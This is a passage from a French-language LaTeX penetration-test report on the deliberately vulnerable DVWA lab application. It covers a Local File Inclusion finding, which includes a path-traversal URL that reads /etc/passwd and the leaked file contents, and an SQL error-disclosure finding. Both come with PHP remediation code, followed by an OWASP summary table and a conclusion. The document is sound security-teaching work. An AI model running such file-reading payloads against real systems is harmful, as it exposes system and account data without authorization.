		\end{itemize}
		\item \textbf{Implémenter MFA (Multi-Factor Authentication)}
		\item \textbf{Logs de connexion} pour auditer les accès
	\end{enumerate}
	
	% ──────────────────────────────────────────────────────────────────────
	% A01: FILE INCLUSION
	% ──────────────────────────────────────────────────────────────────────
	
	\section{A01: Broken Access Control - Local File Inclusion}
	
	\subsection{Description}
	
	Path Traversal (traversée de répertoires) permet d'accéder à des fichiers 
	en dehors du répertoire web autorisé, notamment les fichiers système.
	
	\subsection{Exploitation}
	
	\begin{enumerate}
		\item Accéder à : \textbf{Vulnerabilities → File Inclusion}
		\item Modifier l'URL pour traverser les répertoires:
		\begin{lstlisting}[numbers=none,frame=none,backgroundcolor={},caption=URL modifiée]
			http://192.168.10.100:8080/vulnerabilities/fi/?page=/etc/passwd
		\end{lstlisting}
	\end{enumerate}
	
	\subsection{Résultats}
	
	\textbf{Le fichier /etc/passwd est affiché directement :}
	
	\begin{lstlisting}[style=logstyle,caption=Contenu de /etc/passwd divulgué]
		root:x:0:0:root:/root:/bin/bash
		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		bin:x:2:2:bin:/bin:/usr/sbin/nologin
		sys:x:3:3:sys:/dev:/usr/sbin/nologin
		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
		mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
	\end{lstlisting}
	
	\subsection{Impact}
	
	\begin{tcolorbox}[colback=warningorange!10!white, colframe=warningorange, 
		title=\textbf{CRITICITÉ: HAUTE}]
		\begin{itemize}
			\item Divulgation de la structure système
			\item Énumération de comptes utilisateurs
			\item Base pour attaques de post-exploitation
		\end{itemize}
	\end{tcolorbox}
	
	\subsection{Screenshot}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{file-inclusion-lfi.png}
		\caption{Local File Inclusion - Fichier /etc/passwd Exposé}
		\label{fig:file-inclusion}
	\end{figure}
	
	\subsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Protection contre Path Traversal]
		// VULNÉRABLE
		include($_GET['page'] . '.php');
		
		// SÉCURISÉ - Whitelist
		$allowed_pages = array('home', 'about', 'contact', 'products');
		$page = basename($_GET['page']); // Supprime ../
		
		if (in_array($page, $allowed_pages)) {
			include(__DIR__ . '/pages/' . $page . '.php');
		} else {
			include(__DIR__ . '/pages/error.php');
		}
		
		// ALTERNATIVE - Utiliser un système de templates
		// $smarty = new Smarty();
		// $smarty->display('templates/' . $page . '.tpl');
	\end{lstlisting}
	
	% ──────────────────────────────────────────────────────────────────────
	% A10: ERROR DISCLOSURE
	% ──────────────────────────────────────────────────────────────────────
	
	\section{A10: Mishandling of Exceptional Conditions - Error Disclosure}
	
	\subsection{Description}
	
	Les messages d'erreur détaillés exposent des informations sensibles 
	sur la structure et les technologies utilisées.
	
	\subsection{Exploitation}
	
	La tentative SQL Injection précédente (Section 4.3) a déjà révélé 
	le message d'erreur MariaDB :
	
	\begin{lstlisting}[caption=Message d'Erreur Divulgué]
		You have an error in your SQL syntax; check the manual that corresponds 
		to your MariaDB server version for the right syntax to use near ''' at line 1
	\end{lstlisting}
	
	\subsection{Informations Divulguées}
	
	\begin{itemize}
		\item \textbf{Database Type :} MariaDB (spécifique, pas MySQL générique)
		\item \textbf{SQL Structure :} Révèle le format de la requête vulnérable
		\item \textbf{Syntaxe Details :} Aide à affiner les payloads d'exploitation
	\end{itemize}
	
	\subsection{Impact}
	
	\begin{tcolorbox}[colback=warningorange!10!white, colframe=warningorange, 
		title=\textbf{CRITICITÉ: MOYENNE}]
		Fournit des indices importants pour des attaques plus ciblées.
	\end{tcolorbox}
	
	\subsection{Screenshot}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{sql-injection-error.png}
		\caption{Message d'Erreur SQL Détaillé}
		\label{fig:error-disclosure}
	\end{figure}
	
	\subsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Gestion Sécurisée des Erreurs]
		// VULNÉRABLE - Messages détaillés à l'utilisateur
		try {
			$result = $mysqli->query($sql);
		} catch (Exception $e) {
			echo "Erreur: " . $e->getMessage(); // JAMAIS FAIRE CECI!
		}
		
		// SÉCURISÉ - Logs serveur, message générique à l'utilisateur
		try {
			$result = $mysqli->query($sql);
		} catch (Exception $e) {
			// Log le détail (fichier, pas visible à l'utilisateur)
			error_log("SQL Error: " . $e->getMessage());
			
			// Message générique à l'utilisateur
			die("Une erreur s'est produite. Veuillez contacter l'administrateur.");
		}
		
		// Configuration dans php.ini (en production)
		// display_errors = Off
		// log_errors = On
		// error_log = /var/log/php-errors.log
	\end{lstlisting}
	
	% ══════════════════════════════════════════════════════════════════════
	% CHAPITRE 5 : RÉSUMÉ DES VULNÉRABILITÉS
	% ══════════════════════════════════════════════════════════════════════
	
	\chapter{Résumé Consolidé des Vulnérabilités}
	
	\section{Tableau de Synthèse OWASP Top 10: 2025}
	
	\begin{longtable}{p{2.2cm} p{4.2cm} >{\centering\arraybackslash}p{2.2cm} p{4.2cm}}
		\hline
		% Dans le tableau synthèse (ligne ~1130), remplace les ✓ et ✗:
		\rowcolor{tablerowalt}
		\textbf{A01} & Broken Access Control & HAUTE & LFI [OK] \\
		
		\textbf{A02} & Security Misconfiguration & CRITIQUE & Default Creds [OK] \\
		
		\rowcolor{tablerowalt}
		\textbf{A03} & Software Supply Chain & MOYENNE & Non testée [X] \\
		
		\textbf{A04} & Cryptographic Failures & CRITIQUE & Weak Sessions [OK] \\
		
		\rowcolor{tablerowalt}
		\textbf{A05} & Injection & CRITIQUE & SQL + Command [OK] \\
		
		\textbf{A06} & Insecure Design & MOYENNE & Non testée [X] \\
		
		\rowcolor{tablerowalt}
		\textbf{A07} & Authentication Failures & HAUTE & Brute Force [OK] \\
		
		\textbf{A08} & File Upload/Integrity & CRITIQUE & Web Shell [OK] \\
		
		\rowcolor{tablerowalt}
		\textbf{A09} & Logging/Alerting Failures & MOYENNE & Non testée [X] \\
		
		\textbf{A10} & Exceptional Conditions & MOYENNE & Error Disclosure [OK] \\
		
		\caption{Synthèse OWASP Top 10: 2025 - Résultats d'Évaluation}
		\label{tab:owasp-summary}
	\end{longtable}
	
	\section{Statistiques des Attaques}
	
	\begin{itemize}
		\item \textbf{Vulnérabilités Testées :} 7/10 (70\%)
		\item \textbf{Attaques Réussies :} 8/8 (100\%)
		\item \textbf{Sévérité CRITIQUE :} 4 vulnérabilités
		\item \textbf{Sévérité HAUTE :} 3 vulnérabilités
		\item \textbf{Sévérité MOYENNE :} 1 vulnérabilité
	\end{itemize}

	
	% ══════════════════════════════════════════════════════════════════════
	% CHAPITRE 7 : CONCLUSION
	% ══════════════════════════════════════════════════════════════════════
	
	\chapter{Conclusion}
	
	Cette évaluation a permis de démontrer la présence de \textbf{8 vulnérabilités critiques} 
	dans l'application DVWA, couvrant 7 catégories de la liste OWASP Top 10: 2025.
	
	\section{Résultats Clés}
	
	\begin{itemize}
		\item \textbf{100\% d'Exploitabilité :} Toutes les vulnérabilités testées ont été exploitées avec succès
		\item \textbf{Risque Critique :} 4 vulnérabilités OWASP A05 (Injection), A08 (Upload), A04 (Crypto), A02 (Config)
		\item \textbf{Impact Systémique :} Chaque vulnérabilité permet une compromission complète du système
	\end{itemize}
	
	\section{Leçons Apprises}
	
	\begin{itemize}
		\item La \textbf{validation des entrées} est le fondement de la sécurité applicative
		\item La \textbf{segmentation réseau} limite le blast radius mais ne suffit pas seule
		\item La \textbf{défense en profondeur} (WAF + Code Secure + Monitoring) est essentielle
		\item Les \textbf{erreurs de configuration} (credentials par défaut) sont souvent les plus critiques
	\end{itemize}
	
	\section{Recommandation Finale}
	
	DVWA doit être considérée comme \textbf{NON SÉCURISÉE} pour tout environnement de production. 
	Les vulnérabilités identifiées permettent une compromission complète du système en quelques minutes 
	par un attaquant ayant une connaissance basique de sécurité web.
	
\end{document}